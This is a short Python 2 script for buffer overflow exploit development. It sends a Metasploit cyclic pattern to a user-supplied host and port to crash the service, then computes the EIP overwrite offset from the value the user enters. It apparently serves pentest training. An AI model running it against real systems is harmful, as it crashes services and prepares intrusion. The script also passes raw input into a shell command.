#!/usr/bin/env python
import sys, os, socket

host = str(raw_input("Host: "))
port = int(raw_input("Port: "))

prefix = ''
suffix = '\nexit\n'

print "******************************"
print "Verify the prefix and suffix"
print "[+]Prefix: " + prefix
print "[+]Suffix: " + suffix
print "******************************"

bytesToOverflow = int(raw_input("Crash length: "))
print "[+] Generating unique pattern to obtain exact offset"
uniqueString = os.popen("msf-pattern_create -l " + str(bytesToOverflow)).read()		# Use this and pattern_offset to get exact offset
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(15.0)

payload = prefix + uniqueString + suffix
try:
        print('Connecting...')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        print('Sending...')
        s.send(payload)
        s.close()
        print('Sent fancy buffer! Check the value in EIP')
except:
        print('Failed to connect, try again')

print "Enter the value shown in the EIP exactly as it appears (Big Endian)"
eip = raw_input("EIP: ")
eip = eip.replace("\\x","")
eip = eip.replace("0x","")
print "[+] Locating offset of EIP on the stack"
offsetString = os.popen("msf-pattern_offset -q " + eip).read().split()	#Grab each word of output
offset = int(offsetString[-1])	#Last word of this command is the offset

if prefix:
	print "[*] Exact match at offset " + str(offset) + " (does not include the prefix)"
else:
	print "[*] Exact match at offset " + str(offset)
	print "[*] Exact match at offset " + str(offset)
